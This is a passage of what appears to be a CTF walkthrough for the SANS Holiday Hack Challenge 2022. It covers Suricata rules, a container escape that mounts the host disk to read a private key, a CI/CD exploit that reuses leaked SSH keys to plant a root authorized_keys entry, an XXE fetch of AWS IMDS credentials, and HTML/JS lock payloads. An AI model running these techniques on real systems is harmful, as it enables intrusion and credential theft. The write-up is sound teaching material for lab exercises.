sid:1000;)</code></p>"},{"location":"objectives/o4/#rule-2-http","title":"Rule 2 - HTTP","text":"<p>Question</p> <p>Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP. When there's a match, the message (msg) should read Investigate suspicious connections, possible Dridex infection.</p>  <p>This rule needs to be a little more specific regarding the IP addresses involved in the connection. We need to <code>alert</code> on <code>http</code> protocol traffic between <code>any</code> port on infected IP address 192.185.57.242 and <code>any</code> IP address and port where the network connection was effectively <code>established</code>.</p>    Field Value     Action <code>alert</code>   Protocol <code>http</code>   Traffic flow <code>any any &lt;&gt; 192.185.57.242 any</code>   Keywords <code>flow:established;</code>   Message <code>\"Investigate suspicious connections, possible Dridex infection\";</code>   Identifier <code>sid:1001;</code>     <p>Answer</p> <p><code>alert http any any &lt;&gt; 192.185.57.242 any (msg:\"Investigate suspicious connections, possible Dridex infection\"; flow:established; sid:1001;)</code></p>"},{"location":"objectives/o4/#rule-3-tls","title":"Rule 3 - TLS","text":"<p>Question</p> <p>We heard that some naughty actors are using TLS certificates with a specific CN. Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya. When your rule matches, the message (msg) should read Investigate bad certificates, possible Dridex infection</p>  <p>Stepping it up just a notch, we now need to <code>alert</code> on <code>tls</code> protocol traffic between <code>any</code> source and <code>any</code> destination where the <code>tls.cert_subject</code> contains the Common Name (CN) heardbellith.Icanwepeh.nagoya. Similar to the first rule, we can add <code>nocase</code> to make the CN search case-insensitive, but the rule will work either way.</p>    Field Value     Action <code>alert</code>   Protocol <code>tls</code>   Traffic flow <code>any any -&gt; any any</code>   Keywords <code>tls.cert_subject; content:\"CN=heardbellith.Icanwepeh.nagoya\";</code>   Message <code>\"Investigate bad certificates, possible Dridex infection\";</code>   Identifier <code>sid:1002;</code>     <p>Answer</p> <p><code>alert tls any any -&gt; any any (msg:\"Investigate bad certificates, possible Dridex infection\"; tls.cert_subject; content:\"CN=heardbellith.Icanwepeh.nagoya\"; sid:1002;)</code></p>"},{"location":"objectives/o4/#rule-4-javascript","title":"Rule 4 - JavaScript","text":"<p>Question</p> <p>OK, one more to rule them all and in the darkness find them. Let's watch for one line from the JavaScript: let byteCharacters = atob. Oh, and that string might be GZip compressed - I hope that's OK! Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection</p>  <p>First, let's take a quick moment to appreciate the Lord of the Rings reference here. Just like the second rule, our final rule also needs to <code>alert</code> on <code>http</code> traffic, but this time we need to match on HTTP traffic between <code>any</code> source and <code>any</code> destination, where the <code>http.response_body</code> contains the <code>let byteCharacters = atob</code> JavaScript code snippet.</p>    Field Value     Action <code>alert</code>   Protocol <code>http</code>   Traffic flow <code>any any -&gt; any any</code>   Keywords <code>http.response_body; content:\"let byteCharacters = atob\";</code>   Message <code>\"Suspicious JavaScript function, possible Dridex infection\";</code>   Identifier <code>sid:1003;</code>     <p>Answer</p> <p><code>alert http any any -&gt; any any (msg:\"Suspicious JavaScript function, possible Dridex infection\"; http.response_body; content:\"let byteCharacters = atob\"; sid:1003;)</code></p>"},{"location":"objectives/o4/#validating-the-rules","title":"Validating the rules","text":"<p>Adding these 4 rules to the <code>suricata.rules</code> file and running <code>./rule_checker</code> confirms our solution is correct! </p>"},{"location":"objectives/o4/#response","title":"Response","text":"<p>Fitzy Shortstack</p> <p>Woo hoo - you wielded Suricata magnificently! Thank you! Now to shout the final warning of power to the Snowrog... YOU...SHALL NOT...PASS!!!</p>"},{"location":"objectives/o5/","title":"Clone with a Difference","text":"<p>Difficulty:  Direct link: Intro terminal</p>"},{"location":"objectives/o5/#objective","title":"Objective","text":"<p>Request</p> <p>Clone a code repository. Get hints for this challenge from Bow Ninecandle in the Elfen Ring.</p>   Bow Ninecandle <p>Well hello! I'm Bow Ninecandle! Have you ever used Git before? It's so neat! It adds so much convenience to DevOps, like those times when a new person joins the team. They can just clone the project, and start helping out right away! Speaking of, maybe you could help me out with cloning this repo? I've heard there's multiple methods, but I only know how to do one. If you need more help, check out the panel of very senior DevOps experts.</p>"},{"location":"objectives/o5/#hints","title":"Hints","text":"HTTPS Git Cloning <p>There's a consistent format for Github repositories cloned via HTTPS. Try converting!</p>"},{"location":"objectives/o5/#solution","title":"Solution","text":"Welcome message <pre><code>We just need you to clone one repo:\n'git clonegit@haugfactory.com:asnowball/aws_scripts.git'\nThis should be easy, right?\n\nThing is: it doesn't seem to be working for me.\nThis is a 'public' repository though. I'm so confused!\n\nPlease clone the repo and 'cat' the 'README.md' file.\nThen 'runtoanswer' and tell us the last word of the README.md file!\n</code></pre>  <p>Some of the challenges are designed to help you get acquainted with a specific technology or tool. In previous years, hint terminals were separate from the main objectives. This year however, for the first time, they're much more integrated into the main storyline. For this objective, we need to familiarize ourselves with Git, in preparation for the Jolly CI/CD objective.</p> <p>Trying to clone the repository using <code>git clone git@haugfactory.com:asnowball/aws_scripts.git</code> will throw an error stating Permission denied (publickey), indicating our SSH key located at <code>/home/bow/.ssh/id_rsa</code> isn't accepted. Since Bow notes that this is a public repository, we don't really need to clone via SSH and we should be able to use HTTPS instead.</p>  <p>Using the hint and rewriting the Git URL as https://haugfactory.com/asnowball/aws_scripts.git allows us to successfully clone the repository using <code>git clone https://haugfactory.com/asnowball/aws_scripts.git</code>. We can also verify that the URL has been correctly converted by opening it in a web browser, which will bring up a GitLab web interface for the repository.</p>  <p>Once cloned, <code>cd</code> into the <code>aws_scripts</code> folder, find the last word in the <code>README.md</code> file, and submit it using <code>runtoanswer</code>.</p>   <p>Answer</p> <p>maintainers</p>"},{"location":"objectives/o5/#response","title":"Response","text":"<p>Bow Ninecandle</p> <p>Wow - great work! Thank you! Say, if you happen to be testing containers for security, there are some things you should think about. Developers love to give ALL TeH PERMz so that things \"just work,\" but it can cause real problems. It's always smart to check for excessive user and container permissions. You never know! You might be able to interact with host processes or filesystems!</p>"},{"location":"objectives/o6/","title":"Prison Escape","text":"<p>Difficulty:  Direct link: Escape terminal</p>"},{"location":"objectives/o6/#objective","title":"Objective","text":"<p>Request</p> <p>Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file <code>/home/jailer/.ssh/jail.key.priv</code>?</p>   Tinsel Upatree <p>Hiya hiya, I'm Tinsel Upatree! Check me out, I'm working side-by-side with a real-life Flobbit. Epic! Anyway, would ya' mind looking at this terminal with me? It takes a few seconds to start up, but then you're logged into a super secure container environment! Or maybe it isn't so secure? I've heard about container escapes, and it has me a tad worried. Do you think you could test this one for me? I'd appreciate it!</p>"},{"location":"objectives/o6/#hints","title":"Hints","text":"Over-Permissioned <p>When users are over-privileged, they can often act as root. When containers have too many permissions, they can affect the host!</p>   Mount Up and Ride <p>Were you able to <code>mount</code> up? If so, users' <code>home/</code> directories can be a great place to look for secrets...</p>"},{"location":"objectives/o6/#solution","title":"Solution","text":"Welcome message <pre><code>Greetings Noble Player,\n\nYou find yourself in a jail with a recently captured Dwarven Elf.\n\nHe desperately asks your help in escaping for he is on a quest to aid a friend in a search\nfor treasure inside a crypto-mine.\n\nIf you can help him break free of his containment, he claims you would receive \"MUCH GLORY!\"\n\nPlease, do your best to un-contain yourself and find the keys to both of your freedom.\n</code></pre>  <p>As with many CTFs and real life pentesting engagements, everything starts with some good reconnaissance. Having a solid understanding of the environment we're trying to break into, or in this particular case break out of, is crucial. From a permissions perspective we can verify if there are any elevated permissions we've been granted using <code>sudo -l</code>. This tells us that our user samways is allowed to run any command as the root account. We can either prepend <code>sudo</code> to every command going forward or simply use <code>sudo su</code> to drop into a privileged root shell.</p>  <p>Based on the hint referencing the <code>mount</code> command and the request to read a file stored on the host file system, we can check if any block storage devices are available to mount or connect to our container. <code>lsblk</code> is typically used to list this information, but that particular command isn't available. Instead, we can use <code>fdisk -l</code> or <code>find /dev -type b</code>.</p>  <p>Mounting the <code>/dev/vda</code> block device to the <code>/mnt</code> folder using the command <code>mount /dev/vda /mnt</code> will make the content of the storage device accessible in our container and allows us to show the hex string via <code>cat /mnt/home/jailer/.ssh/jail.key.priv</code>.</p>  <p>Channeling our inner Captain Hindsight, solving this challenge really only requires 2 commands:</p> Terminal commands to solve the challenge<pre><code>sudo mount /dev/vda /mnt  # mount /dev/vda to /mnt\ncat /mnt/home/jailer/.ssh/jail.key.priv  # print the hex string\n</code></pre>  <p>Answer</p> <p>082bb339ec19de4935867</p>"},{"location":"objectives/o6/#response","title":"Response","text":"<p>Tinsel Upatree</p> <p>Great! Thanks so much for your help! Now that you've helped me with this, I have time to tell you about the deployment tech I've been working on! Continuous Integration/Continuous Deployment pipelines allow developers to iterate and innovate quickly. With this project, once I push a commit, a GitLab runner will automatically deploy the changes to production. WHOOPS! I didn\u2019t mean to commit that to <code>http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</code>... Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things!</p>"},{"location":"objectives/o7/","title":"Jolly CI/CD","text":"<p>Difficulty:  Direct link: CI/CD terminal</p>"},{"location":"objectives/o7/#objective","title":"Objective","text":"<p>Request</p> <p>Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring.</p>   Rippin Proudboot <p>Yes, hello, I'm Rippin Proudboot. Can I help you? Oh, you'd like to help me? Well, I'm not quite sure you can, but we shall see. The elves here introduced me to this new CI/CD technology. It seems quite efficient. Unfortunately, the sporcs seem to have gotten their grubby mits on it as well, along with the Elfen Ring. They've used CI/CD to launch a website, and the Elfen Ring to power it. Might you be able to check for any misconfigurations or vulnerabilities in their CI/CD pipeline? If you do find anything, use it to exploit the website, and get the ring back!</p>"},{"location":"objectives/o7/#hints","title":"Hints","text":"Switching Hats <p>If you find a way to impersonate another identity, you might try re-cloning a repo with their credentials.</p>   Commiting to Mistakes <p>The thing about Git is that every step of development is accessible \u2013 even steps you didn't mean to take! <code>git log</code> can show code skeletons.</p>"},{"location":"objectives/o7/#solution","title":"Solution","text":"Welcome message <pre><code>Greetings Noble Player,\n\nMany thanks for answering our desperate cry for help!\n\nYou may have heard that some evil Sporcs have opened up a web-store selling\ncounterfeit banners and flags of the many noble houses found in the land of\nthe North! They have leveraged some dastardly technology to power their\nstorefront, and this technology is known as PHP!\n\n***gasp***\n\nThis strorefront utilizes a truly despicable amount of resources to keep the\nwebsite up. And there is only a certain type of Christmas Magic capable of\npowering such a thing\u2026 an Elfen Ring!\n\nAlong with PHP there is something new we've not yet seen in our land.\nA technology called Continuous Integration and Continuous Deployment!\n\nBe wary!\n\nMany fair elves have suffered greatly but in doing so, they've managed to\nsecure you a persistent connection on an internal network.\n\nBTW take excellent notes!\n\nShould you lose your connection or be discovered and evicted the\nelves can work to re-establish persistence. In fact, the sound off fans\nand the sag in lighting tells me all the systems are booting up again right now.\n\nPlease, for the sake of our Holiday help us recover the Ring and save Christmas!\n</code></pre>"},{"location":"objectives/o7/#obtain-write-access-to-the-git-repository","title":"Obtain write access to the Git repository","text":"<p>Start by cloning the repository mentioned by Tinsel Upatree using <code>git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</code> and taking a look at the commit history. Git repositories keep a permanent log of all changes, including mistakes like the one Tinsel made as they were explaining their CI/CD pipeline to us. Once the repository has been cloned, change to the <code>wordpress.flag.net.internal.git</code> folder and use <code>git log</code> to print commit message details.</p>  <p>That whoops message seems to indicate someone messed up and tried to correct the problem with an update. So, let's take a closer look at the previous commit to see exactly what files were changed. Use <code>git show abdea0ebb21b156c01f7533cea3b895c26198c98</code> to bring up the commit details.</p>  Reading Git diff output <p>Git commit details include output from <code>git diff</code> which can be a little daunting to read at first. The syntax is meant to show exactly what information was added and removed from each file between different commits. Here's a great write-up that can help to better understand the details of the <code>diff</code> syntax.</p>   <p>Looks like Tinsel accidently added their private and public SSH keys to the git repository. We can use these files to impersonate Tinsel and clone a writable copy of the repository which we can commit our own changes to. Checkout the commit containing the SSH key files (line 3), create an <code>.ssh</code> folder (line 6), copy the private <code>.deploy</code> and public <code>.deploy.pub</code> SSH keys (lines 7-8), lock down the <code>.ssh</code> folder permissions (line 9), and configure a Git email and user name (lines 12-13). For the latter we use the Author information found in the git log commit details.</p> Copy SSH keys and configure Git<pre><code># Checkout the commit containing the SSH keys\ncd ~/wordpress.flag.net.internal\ngit checkout abdea0ebb21b156c01f7533cea3b895c26198c98\n\n# Copy the SSH keys\nmkdir ~/.ssh\ncp ~/wordpress.flag.net.internal/.ssh/.deploy ~/.ssh/id_ed25519\ncp ~/wordpress.flag.net.internal/.ssh/.deploy.pub ~/.ssh/id_ed25519.pub\nchmod -R g-rwx,o-rwx ~/.ssh\n\n# Configure Git\ngit config --global user.email \"sporx@kringlecon.com\"\ngit config --global user.name \"knee-oh\"\n</code></pre> <p>Leveraging what we learned in Objective 5, we can now convert the repository HTTP URL to its SSH counterpart and clone a fresh copy using <code>git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git</code>.</p>"},{"location":"objectives/o7/#exploit-the-cicd-pipeline","title":"Exploit the CI/CD pipeline","text":"<p>Taking a closer look at the <code>.gitlab-ci.yml</code> configuration file shows a <code>deploy-job</code> entry which leverages <code>rsync</code> to copy any changes from gitlab.flag.net.internal to wordpress.flag.net.internal each time a commit is pushed to the Git repository.</p>  <p>.gitlab-ci.yml</p> <pre><code>stages:\n  - deploy\n\ndeploy-job:\n  stage: deploy\n  environment: production\n  script:\n    - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\"\n       --chown=www-data:www-data -atv --delete --progress\n       ./ root@wordpress.flag.net.internal:/var/www/html\n</code></pre>  <p>The ability to push changes to the Git repo gives us a few options to obtain access to wordpress.flag.net.internal. We could have the CI/CD automation copy over a simple PHP web shell and use curl to call the web shell and remotely execute commands on the host. A slightly more robust solution is to leverage the automation pipeline to add our public SSH key to the root user's <code>authorized_keys</code> file which will grant us the ability to SSH into the web server with maximum privileges.</p> <p>First, copy the newly obtained <code>~/.ssh/id_ed25519.pub</code> file to <code>~/wordpress.flag.net.internal/id_ed25519.pub</code>. The existing automation will ensure it ends up at <code>/var/www/html/id_ed25519.pub</code> on wordpress.flag.net.internal. Next, update the <code>.gitlab-ci.yml</code> config file and add a new <code>copy-key-job</code> entry that initiates an SSH session from the Gitlab host to the Wordpress host and appends the contents of <code>/var/www/html/id_ed25519.pub</code> to <code>/root/.ssh/authorized_keys</code> (lines 12-17).</p>  <p>.gitlab-ci.yml</p> <pre><code>stages:\n  - deploy\n\ndeploy-job:\n  stage: deploy\n  environment: production\n  script:\n    - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\"\n       --chown=www-data:www-data -atv --delete --progress\n       ./ root@wordpress.flag.net.internal:/var/www/html\n\ncopy-key-job:\n  stage: deploy\n  environment: production\n  script:\n    - ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal\n       'cat /var/www/html/id_ed25519.pub &gt;&gt; /root/.ssh/authorized_keys'\n</code></pre>  <p>With the <code>id_ed25519.pub</code> file copied to our locally cloned Git repository folder and a new job entry added to <code>.gitlab-ci.yml</code> everything's in place to run our exploit. All that's left is for us to commit our changes (lines 2-3), push the modified files to the gitlab.flag.net.internal GitLab server (line 4), and wait for the updated CI/CD automation to execute.</p> Commit and push changes to the GitLab host<pre><code>cd ~/wordpress.flag.net.internal\ngit add id_ed25519.pub .gitlab-ci.yml\ngit commit -m 'Inconspicuous update. Please ignore!'\ngit push\n</code></pre> <p>It might take a few seconds, but once the CI/CD automation completes its run we should be able to remotely log in to the web server using <code>ssh root@wordpress.flag.net.internal</code>. Since we're using an interactive shell as root we have free reign to roam around. The flag value we need to submit on our badge can be found in the <code>/flag.txt</code> file. That ASCII art though! </p>   <p>Answer</p> <p>oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</p>"},{"location":"objectives/o7/#response","title":"Response","text":"<p>Rippin Proudboot</p> <p>How unexpected, you were actually able to help! Well, then I must apoligize for my dubious greeting. Us Flobbits can't help it sometimes, it's just in our nature. Right then, there are other Flobbits that need assistance further into the burrows. Thank you, and off you go.</p>"},{"location":"objectives/o8/","title":"Boria PCAP Mining","text":"<p>Difficulty:  Direct link: boriaArtifacts.zip</p>"},{"location":"objectives/o8/#objective","title":"Objective","text":"<p>Request</p> <p>Use the artifacts from Alabaster Snowball to analyze this attack on the Boria mines.</p>   Alabaster Snowball <p>Hey there! I'm Alabaster Snowball And I have to say, I'm a bit distressed. I was working with the dwarves and their Boria mines, and I found some disturbing activity! Looking through these artifacts, I think something naughty's going on. Can you please take a look and answer a few questions for me? First, we need to know where the attacker is coming from. If you haven't looked at Wireshark's Statistics menu, this might be a good time!</p>"},{"location":"objectives/o8/#hints","title":"Hints","text":"Wireshark Top Talkers <p>The victim web server is 10.12.42.16. Which host is the next top talker?</p>   Wireshark String Searching <p>The site's login function is at <code>/login.html</code>. Maybe start by searching for a string.</p>   Status Codes <p>With forced browsing, there will be many 404 status codes returned from the web server. Look for 200 codes in that group of 404s. This one can be completed with the PCAP or the log file.</p>   Instance Metadata Service <p>AWS uses a specific IP address to access IMDS, and that IP only appears twice in this PCAP.</p>"},{"location":"objectives/o8/#solution","title":"Solution","text":""},{"location":"objectives/o8/#naughty-ip","title":"Naughty IP","text":"<p>Question</p> <p>Most of the traffic to this site is nice, but one IP address is being naughty! Which is it? Visit Sparkle Redberry in the Tolkien Ring for hints.</p>  <p>Unpack the <code>boriaArtifacts.zip</code> archive and open the <code>victim.pcap</code> packet capture in Wireshark. Open the Statistics &gt; Conversations menu and sort by Packets on the IPv4 tab. This tells us that 18.222.86.32 was the most chatty external host.</p>  <p>We can confirm this by extracting and counting all unique IP addresses from the <code>weberror.log</code> file using <code>grep -e '^[0-9].*' weberror.log | cut -d' ' -f1 | sort | uniq -c | sort -r</code>. The same IP address is at the top of the list here as well.</p>   <p>Answer</p> <p>18.222.86.32</p>   Alabaster Snowball <p>Aha, you found the naughty actor! Next, please look into the account brute force attack. You can focus on requests to <code>/login.html~</code></p>"},{"location":"objectives/o8/#credential-mining","title":"Credential Mining","text":"<p>Question</p> <p>The first attack is a brute force login. What's the first username tried?</p>  <p>Now that we have our malicious IP address, we can use the Wireshark display filter <code>http &amp;&amp; ip.src == 18.222.86.32 and http.request.uri == \"/login.html\" and http.request.method == \"POST\"</code> to only show HTTP POST requests made by host 18.222.86.32 against the <code>/login.html</code> login page.</p>  <p>The HTML Form data for each HTTP POST request shows the submitted username and password values, which is alice for the first set of brute force login attempts. Right-clicking on the username Value field and selecting Apply as Column from the context menu will add these values as a column to the list view, as shown in the previous screenshot.</p>   <p>Answer</p> <p>alice</p>   Alabaster Snowball <p>Alice? I totally expected Eve! Well how about forced browsing? What's the first URL path they found that way? The misses will have HTTP status code <code>404</code> and, in this case, the successful guesses return <code>200</code>.</p>"},{"location":"objectives/o8/#404-ftw","title":"404 FTW","text":"<p>Question</p> <p>The next attack is forced browsing where the naughty one is guessing URLs. What's the first successful URL path in this attack?</p>  <p>Searching the web logs using <code>grep 18.222.86.32 weberror.log</code> tells us when 18.222.86.32 started making random requests. They can be identified as a large volume of sequential 404 Not Found log entries which appear to start at 16:47:45 on October 5, 2022.</p>  <p>Updating the previous command to <code>grep 18.222.86.32 weberror.log | grep -v ' 404 -'</code> will filter out all the 404 noise and allow us to locate the first successful request on or after 16:47:45, which appears to be <code>/proc</code>.</p>   <p>Answer</p> <p><code>/proc</code></p>   Alabaster Snowball <p>Great! Just one more challenge! It looks like they made the server pull credentials from IMDS. What URL was forced? AWS uses a specific IP address for IMDS lookups. Searching for that in the PCAP should get you there quickly.</p>"},{"location":"objectives/o8/#imds-xxe-and-other-abbreviations","title":"IMDS, XXE, and Other Abbreviations","text":"<p>Question</p> <p>The last step in this attack was to use XXE to get secret keys from the IMDS service. What URL did the attacker force the server to fetch?</p>  <p>The Instance Metadata Service (IMDS) typically listens on IPv4 address 169.254.169.254. Searching through <code>weberror.log</code> for this IP address and printing a few lines before and after each match using <code>grep -B 2 -A 25 169.254.169.254 weberror.log</code> tells us that the attacker successfully sent several XXE payloads and gradually worked their way to <code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</code>, which holds the secret key information.</p>  <p>The POST requests responsible for the above log entries can be found in Wireshark by applying an <code>xml</code> display filter. Adding the DTD Tag column by right-clicking on the desired eXtensible Markup Language node and selecting Apply as Column helps us to see all the different XML payloads 18.222.86.32 sent over HTTP before successfully accessing the AWS secrets.</p>   <p>Answer</p> <p><code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</code></p>"},{"location":"objectives/o8/#response","title":"Response","text":"<p>Alabaster Snowball</p> <p>Fantastic! It seems simpler now that I've seen it once. Thanks for showing me! Hey, so maybe I can help you out a bit with the door to the mines. First, it'd be great to bring an Elvish keyboard, but if you can't find one, I'm sure other input will do. Instead, take a minute to read the HTML/JavaScript source and consider how the locks are processed. Next, take a look at the <code>Content-Security-Policy header</code>. That drives how certain content is handled. Lastly, remember that input sanitization might happen on either the client or server ends!</p>"},{"location":"objectives/o9/","title":"Open Boria Mine Door","text":"<p>Difficulty:  Direct link: Minedoor website</p>"},{"location":"objectives/o9/#objective","title":"Objective","text":"<p>Request</p> <p>Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get some hints for this challenge.</p>   Hal Tandybuck <p>Oh hi, I'm Hal Tandybuck. And who might you be? I'm hanging out by the door to the mines here because, well, I haven't figured out the locks yet. It actually reminds me of this locked crate I had three years ago... I doubt we'll get much in the way of debug output. Think you can help me get through?</p>"},{"location":"objectives/o9/#hints","title":"Hints","text":"Content-Security-Policy <p>Understanding how Content-Security-Policy works can help with this challenge.</p>   Input Validation <p>Developers use both client- and server-side input validation to keep out naughty input.</p>   Lock Mechanism <p>The locks take input, render some type of image, and process on the back end to unlock. To start, take a good look at the source HTML/JavaScript.</p>"},{"location":"objectives/o9/#solution","title":"Solution","text":""},{"location":"objectives/o9/#lock-1","title":"Lock 1","text":"<p>To solve this objective only the first 3 locks need to be opened. The remaining locks aren't required, but opening them will result in an additional hint. To unlock, each colored input needs to be connected with its output by a path in the corresponding color. We do this by submitting text, HTML, or JavaScript. The server renders our input and converts it to an image which is inserted on the lock. For the first lock there aren't any restrictions and a sample solution is even provided in the HTML source itself.</p>  <p>Entering <code>@&amp;@&amp;&amp;W&amp;&amp;W&amp;&amp;&amp;&amp;</code> creates a path between the white input and white output since each character is connected with the one next to it. As an alternative we can also submit a series of <code>&amp;block;</code> characters which will be rendered as a horizontal white bar.</p>"},{"location":"objectives/o9/#lock-2","title":"Lock 2","text":"<p>Looking at the HTML source for the second lock we see that it defines a Content-Security-Policy for stylesheets. However, it explicitly specifies <code>unsafe-inline</code> which means it allows style information between <code>&lt;style&gt;&lt;/style&gt;</code> tags or on HTML objects.</p>  <p>To connect input and output we can submit an HTML <code>div</code> element with inline CSS which renders a white rectangle large enough to fill the whole lock. For example, <code>&lt;div style=\"background: white; width: 200px; height: 170px;\"&gt;&lt;/div&gt;</code> does the trick.</p>"},{"location":"objectives/o9/#lock-3","title":"Lock 3","text":"<p>Input on this lock is also restricted by a Content-Security-Policy, but this time the <code>unsafe-inline</code> directive applies to JavaScript.</p>  <p>By submitting <code>&lt;script&gt;document.body.style.backgroundColor=\"blue\";&lt;/script&gt;</code> we change the background of the <code>body</code> tag to blue. This will cause the server to render a blue square that covers the whole lock, creating a path between input and output.</p> <p>Alternatively, we can use the previous <code>div</code> technique but with a blue background on the second lock first to make the server render a blue image, copy the image link, and then submit <code>&lt;img src=\"images/replace_with_proper_filename.png\"&gt;</code> on the third lock.</p>"},{"location":"objectives/o9/#lock-4","title":"Lock 4","text":"<p>No Content-Security-Policy this time. Instead, the lock applies client-side input validation on the HTML form. Each time the input field loses focus the <code>sanitizeInput</code> JavaScript function is called which strips certain characters like <code>&lt;</code>, <code>&gt;</code>, <code>\"</code>, and <code>'</code>.</p>  <p>To get past the input validation we need to remove the <code>onblur</code> event listener from the <code>input</code> form element using our web browser's developer tools. We're now free to submit two <code>div</code> elements with a white (line 1) and blue (line 2) background, respectively.</p> Create lock 4 image<pre><code>&lt;div style=\"background: white; width: 200px; height: 85px;\"&gt;&lt;/div&gt;\n&lt;div style=\"background: blue; width: 200px; height: 85px;\"&gt;&lt;/div&gt;\n</code></pre>"},{"location":"objectives/o9/#lock-5","title":"Lock 5","text":"<p>The fifth lock is a combination of the restrictions from the previous two locks. First, there's restrictions applied via a Content-Security-Policy. Luckily for us an <code>unsafe-inline</code> directive allows inline JavaScript. Secondly, there's client-side input validation via the same <code>sanitizeInput</code> JavaScript function as seen on Lock 4.</p>  <p>We already know we can bypass the client-side input validation by deleting the <code>onblur</code> event listener from the <code>input</code> form element. The bigger challenge is finding a way to draw an image that will connect the weirdly positioned inputs and outputs. By using a <code>canvas</code> element (lines 3-5) in combination with JavaScript code which applies a blue background (lines 8-9), draws an outline (lines 11-16), and fills the outline with red (lines 17-18), we can make the server render the desired image and open the lock.</p> Create lock 5 image<pre><code>&lt;script&gt;\n/* Create and set the canvas size */\ncanvas = document.createElement('canvas');\ncanvas.width = 200;\ncanvas.height = 200;\ncontext = canvas.getContext(\"2d\");\n/* Fill the background with blue */\ncontext.fillStyle = \"blue\";\ncontext.fillRect(0, 0, 200, 200);\n/* Draw an outline and fill with red */\ncontext.beginPath();\ncontext.moveTo(0, 0);\ncontext.lineTo(200, 0);\ncontext.lineTo(200, 90);\ncontext.lineTo(0, 200);\ncontext.lineTo(0, 0);\ncontext.fillStyle = \"red\";\ncontext.fill();\n/* Set the canvas as the only body element */\ndocument.body.replaceChildren(canvas);\n&lt;/script&gt;\n</code></pre>"},{"location":"objectives/o9/#lock-6","title":"Lock 6","text":"<p>As expected, the final lock is the most restrictive with a Content-Security-Policy for both stylesheets and JavaScript. This means none of our previously used techniques will work as there's no <code>unsafe-inline</code> directives to exploit.</p>  <p>We could leverage the previous <code>canvas</code> solution by first making lock 1, 3, 4, or 5 render the image we need for lock 6 (see below), copying the image link, and submitting <code>&lt;img src=\"images/replace_with_proper_filename.png\"&gt;</code> on the final lock.</p>  Create lock 6 image <pre><code>&lt;script&gt;\n/* Create and set the canvas size */\ncanvas = document.createElement('canvas');\ncanvas.width = 200;\ncanvas.height = 200;\ncontext = canvas.getContext(\"2d\");\n/* Fill the background with green */\ncontext.fillStyle = \"#00ff00\";\ncontext.fillRect(0, 0, 200, 200);\n/* Draw the first outline and fill with red */\ncontext.beginPath();\ncontext.moveTo(0, 90);\ncontext.lineTo(200, 90);\ncontext.lineTo(200, 200);\ncontext.lineTo(0, 120);\ncontext.lineTo(0, 90);\ncontext.fillStyle = \"red\";\ncontext.fill();\n/* Draw the second outline and fill with blue */\ncontext.beginPath();\ncontext.moveTo(0, 120);\ncontext.lineTo(200, 200);\ncontext.lineTo(0, 200);\ncontext.lineTo(0, 120);\ncontext.fillStyle = \"blue\";\ncontext.fill();\n/* Set the canvas as the only body element */\ndocument.body.replaceChildren(canvas);\n&lt;/script&gt;\n</code></pre>  <p>Instead, let's opt for a technique we haven't used before. Images can be added to an HTML page by putting Base64-encoded image data in the <code>src</code> attribute of an <code>img</code> element. Create a PNG image in your preferred image editor, use <code>base64 image.png</code> or CyberChef to generate the Base64-encoded image data, and submit it on the lock using <code>&lt;img src=\"data:image/png;base64,...&gt;</code>. Expand the section below for an example, based on this PNG image, which can be copy/pasted onto the final lock.</p>  Lock 6 Base64-encoded image <pre><code>&lt;img src=\"data:image/png;base64,\niVBORw0KGgoAAAANSUhEUgAAAMgAAACqCAYAAADoZADPAAAAAXNSR0IArs4c6QAAAKRlWElmTU0AKgAAAAgABgESAAMAA\nAABAAEAAAEaAAUAAAABAAAAVgEbAAUAAAABAAAAXgEoAAMAAAABAAIAAAEyAAIAAAAUAAAAZodpAAQAAAABAAAAegAAAA\nAAAABIAAAAAQAAAEgAAAABMjAyMjoxMjowOCAyMjoyMToxNAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAyKADAAQAAAA\nBAAAAqgAAAACiqz2XAAAACXBIWXMAAAsTAAALEwEAmpwYAAAGqWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1w\nbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNi4wLjAiPgogICA8cmRmOlJERiB4b\nWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2\nNyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWY\nvMS4wLyIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iCiAgICAgICAg\nICAgIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAgICB4bWxuczpzd\nEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIgogICAgICAgICAgICB4bW\nxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnBob3Rvc2hvcD0iaHR\n0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyI+CiAgICAgICAgIDxleGlmOkNvbG9yU3BhY2U+NjU1MzU8L2V4\naWY6Q29sb3JTcGFjZT4KICAgICAgICAgPGV4aWY6UGl4ZWxYRGltZW5zaW9uPjY1NzwvZXh